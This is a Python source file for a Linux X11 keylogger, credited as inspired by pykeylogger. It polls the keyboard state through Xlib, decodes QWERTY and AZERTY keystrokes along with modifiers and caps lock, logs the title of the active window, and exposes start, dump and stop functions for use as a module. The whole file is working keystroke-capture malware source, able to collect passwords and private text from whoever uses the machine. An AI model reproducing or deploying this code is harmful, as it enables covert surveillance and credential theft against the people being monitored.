# -*- coding: utf-8 -*-
# inspired from https://github.com/amoffat/pykeylogger
import sys
from time import sleep, time
import ctypes as ct
from ctypes.util import find_library
import subprocess
import threading

from subprocess import Popen, PIPE
import re

x11 = ct.cdll.LoadLibrary(find_library("X11"))
display = x11.XOpenDisplay(None)

# this will hold the keyboard state.  32 bytes, with each bit representing the state for a single key.
keyboard = (ct.c_char * 32)()
keyboard_layout = False

# these are the locations (byte, byte value) of special keys to watch
shift_keys = ((6,4), (7,64))
altgr_keys = [(13,16)]
modifiers = {
    "left shift": (6,4),
    "right shift": (7,64),
    "left ctrl": (4,32),
    "right ctrl": (13,2),
    "left alt": (8,1),
    "right alt": (13,16)
}
last_pressed = set()
last_pressed_adjusted = set()
last_modifier_state = {}
caps_lock_state = 0

# key is byte number, value is a dictionary whose keys are values for that byte, and values are the keys corresponding to those byte values 
key_mapping = {}
key_mapping_qwerty = {
    1: {
        0b00000010: "<esc>",
        0b00000100: ("1", "!"),
        0b00001000: ("2", "@"),
        0b00010000: ("3", "#"),
        0b00100000: ("4", "$"),
        0b01000000: ("5", "%"),
        0b10000000: ("6", "^"),
    },
    2: {
        0b00000001: ("7", "&"),
        0b00000010: ("8", "*"),
        0b00000100: ("9", "("),
        0b00001000: ("0", ")"),
        0b00010000: ("-", "_"),
        0b00100000: ("=", "+"),
        0b01000000: "<backspace>",
        0b10000000: "<tab>",
    },
    3: {
        0b00000001: ("q", "Q"),
        0b00000010: ("w", "W"),
        0b00000100: ("e", "E"),
        0b00001000: ("r", "R"),
        0b00010000: ("t", "T"),
        0b00100000: ("y", "Y"),
        0b01000000: ("u", "U"),
        0b10000000: ("i", "I"),
    },
    4: {
        0b00000001: ("o", "O"),
        0b00000010: ("p", "P"),
        0b00000100: ("[", "{"),
        0b00001000: ("]", "}"),
        0b00010000: "<enter>",
        #0b00100000: "<left ctrl>",
        0b01000000: ("a", "A"),
        0b10000000: ("s", "S"),
    },
    5: {
        0b00000001: ("d", "D"),
        0b00000010: ("f", "F"),
        0b00000100: ("g", "G"),
        0b00001000: ("h", "H"),
        0b00010000: ("j", "J"),
        0b00100000: ("k", "K"),
        0b01000000: ("l", "L"),
        0b10000000: (";", ":"),
    },
    6: {
        0b00000001: ("'", "\""),
        0b00000010: ("`", "~"),
        #0b00000100: "<left shift>",
        0b00001000: ("\\", "|"),
        0b00010000: ("z", "Z"),
        0b00100000: ("x", "X"),
        0b01000000: ("c", "C"),
        0b10000000: ("v", "V"),
    },
    7: {
        0b00000001: ("b", "B"),
        0b00000010: ("n", "N"),
        0b00000100: ("m", "M"),
        0b00001000: (",", "<"),
        0b00010000: (".", ">"),
        0b00100000: ("/", "?"),
        #0b01000000: "<right shift>",
    },
    8: {
        #0b00000001: "<left alt>",
        0b00000010: " ",
        0b00000100: "<caps lock>",
    },
    13: {
        #0b00000010: "<right ctrl>",
        #0b00010000: "<right alt>",
    },
}

key_mapping_azerty = {
    1: {
        0b00000010: "<esc>",
        0b00000100: ("&", "1", ""),
        0b00001000: ("é", "2", "~"),
        0b00010000: ('"', "3", "#"),
        0b00100000: ("'", "4", "{"),
        0b01000000: ("(", "5", "["),
        0b10000000: ("-", "6", "|"),
    },
    2: {
        0b00000001: ("è", "7", "`"),
        0b00000010: ("_", "8", "\\"),
        0b00000100: ("ç", "9", "^"),
        0b00001000: ("à", "0", "@"),
        0b00010000: (")", "", "]"),
        0b00100000: ("=", "+", "}"),
        0b01000000: "<backspace>",
        0b10000000: "<tab>",
    },
    3: {
        0b00000001: ("a", "A"),
        0b00000010: ("z", "Z"),
        0b00000100: ("e", "E"),
        0b00001000: ("r", "R"),
        0b00010000: ("t", "T"),
        0b00100000: ("y", "Y"),
        0b01000000: ("u", "U"),
        0b10000000: ("i", "I"),
    },
    4: {
        0b00000001: ("o", "O"),
        0b00000010: ("p", "P"),
        0b00000100: ("^", "¨"),
        0b00001000: ("$", "£"),
        0b00010000: "<enter>",
        #0b00100000: "<left ctrl>",
        0b01000000: ("q", "Q"),
        0b10000000: ("s", "S"),
    },
    5: {
        0b00000001: ("d", "D"),
        0b00000010: ("f", "F"),
        0b00000100: ("g", "G"),
        0b00001000: ("h", "H"),
        0b00010000: ("j", "J"),
        0b00100000: ("k", "K"),
        0b01000000: ("l", "L"),
        0b10000000: ("m", "M"),
    },
    6: {
        0b00000001: ("ù", "%"),
        0b00000010: ("*", "µ"),
        #0b00000100: "<left shift>",
        0b00001000: ("<", ">"),
        0b00010000: ("w", "W"),
        0b00100000: ("x", "X"),
        0b01000000: ("c", "C"),
        0b10000000: ("v", "V"),
    },
    7: {
        0b00000001: ("b", "B"),
        0b00000010: ("n", "N"),
        0b00000100: (",", "?"),
        0b00001000: (";", "."),
        0b00010000: (":", "/"),
        0b00100000: ("!", "§"),
        #0b01000000: "<right shift>",
    },
    8: {
        #0b00000001: "<left alt>",
        0b00000010: " ",
        0b00000100: "<caps lock>",
    },
    13: {
        #0b00000010: "<right ctrl>",
        #0b00010000: "<right alt>",
    },
}

def keylogger_start():
    global keyboard_layout
    if hasattr(sys, 'KEYLOGGER_THREAD'):
        return False

    keyLogger = KeyLogger()
    keyboard_layout = keyLogger.getKeyboardLayout()
    if not keyboard_layout:
        return "no_x11"

    keyLogger.start()
    sys.KEYLOGGER_THREAD=keyLogger
    return True

def keylogger_dump():
    if hasattr(sys, 'KEYLOGGER_THREAD'):
        return sys.KEYLOGGER_THREAD.dump()

def keylogger_stop():
    if hasattr(sys, 'KEYLOGGER_THREAD'):
        sys.KEYLOGGER_THREAD.stop()
        del sys.KEYLOGGER_THREAD
        return True
    return False

def get_active_window_title():
    root_check = ''
    root = Popen(['xprop', '-root'],  stdout=PIPE)

    if root.stdout != root_check:
        root_check = root.stdout

        for i in root.stdout:
            if '_NET_ACTIVE_WINDOW(WINDOW):' in i:
                id_ = i.split()[4]
                id_w = Popen(['xprop', '-id', id_], stdout=PIPE)
        id_w.wait()
        buff = []
        for j in id_w.stdout:
            buff.append(j)

        for line in buff:
            match = re.match("WM_NAME\((?P<type>.+)\) = (?P<name>.+)", line)
            if match != None:
                type = match.group("type")
                if type == "STRING" or type == "COMPOUND_TEXT":
                    return match.group("name")
        return "Active window not found"

class KeyLogger(threading.Thread):
    def __init__(self, *args, **kwargs):
        threading.Thread.__init__(self, *args, **kwargs)

        if not hasattr(sys, 'KEYLOGGER_BUFFER'):
            sys.KEYLOGGER_BUFFER=""
        
        self.stopped=False
        self.last_window=None
        self.last_clipboard=""

    def append_key_buff(self, k):
        if k:
            sys.KEYLOGGER_BUFFER+=str(k)

    def log(self, callback, sleep_interval=.005):
        while not self.stopped:
            sleep(sleep_interval)
            changed, modifiers, keys = self.fetch_keys()
            if changed: callback(keys)
            window = get_active_window_title()
            if self.last_window != window:
                self.last_window = window
                callback("\n%s: %s \n"%(time(),str(window)))

    def run(self):
        global key_mapping, keyboard_layout
        # keyboard_layout = self.getKeyboardLayout()
        if keyboard_layout == 'azerty':
            key_mapping = key_mapping_azerty
        else:
            key_mapping = key_mapping_qwerty
        self.log(self.append_key_buff)
            
    def stop(self):
        self.stopped=True

    def dump(self):
        res=sys.KEYLOGGER_BUFFER
        sys.KEYLOGGER_BUFFER=""
        return res

    def getKeyboardLayout(self):
        command = 'setxkbmap -print'
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for line in process.stdout.readlines():
            if 'azerty' in line:
                return 'azerty'
            elif 'qwerty' in line:
                return 'qwerty'
        # adding a default  value will crash the process on server without x11 graphical interface
        return False

    def fetch_keys_raw(self):
        x11.XQueryKeymap(display, keyboard)
        return keyboard

    def fetch_keys(self):
        global caps_lock_state, last_pressed, last_pressed_adjusted, last_modifier_state
        keypresses_raw = self.fetch_keys_raw()

        # check modifier states (ctrl, alt, shift keys)
        modifier_state = {}
        for mod, (i, byte) in modifiers.iteritems():
            modifier_state[mod] = bool(ord(keypresses_raw[i]) & byte)
        
        # shift pressed ? 
        shift = 0
        for i, byte in shift_keys:
            if ord(keypresses_raw[i]) & byte:
                shift = 1
                break

        altgr = 0
        if keyboard_layout == "azerty":
            # altgr pressed ? 
            for i, byte in altgr_keys:
                if ord(keypresses_raw[i]) & byte:
                    altgr = 2
                    break

        # caps lock state
        if ord(keypresses_raw[8]) & 4: caps_lock_state = int(not caps_lock_state)

        # aggregate the pressed keys
        pressed = []
        for i, k in enumerate(keypresses_raw):
            o = ord(k)
            if o:
                for byte,key in key_mapping.get(i, {}).iteritems():
                    if byte & o:
                        if isinstance(key, tuple): key = key[shift or caps_lock_state or altgr]
                        pressed.append(key)
        
        tmp = pressed
        pressed = list(set(pressed).difference(last_pressed))
        state_changed = tmp != last_pressed and (pressed or last_pressed_adjusted)
        last_pressed = tmp
        last_pressed_adjusted = pressed

        if pressed: pressed = pressed[0]
        else: pressed = None

        state_changed = last_modifier_state and (state_changed or modifier_state != last_modifier_state)
        last_modifier_state = modifier_state

        return state_changed, modifier_state, pressed


if __name__=="__main__":
    #the main is only here for testing purpose and won't be run by modules
    now = time()
    done = lambda: time() > now + 5
    keyLogger = KeyLogger()
    keyLogger.start()
    sleep(5)
        
    print keyLogger.dump()
    keyLogger.stop()
    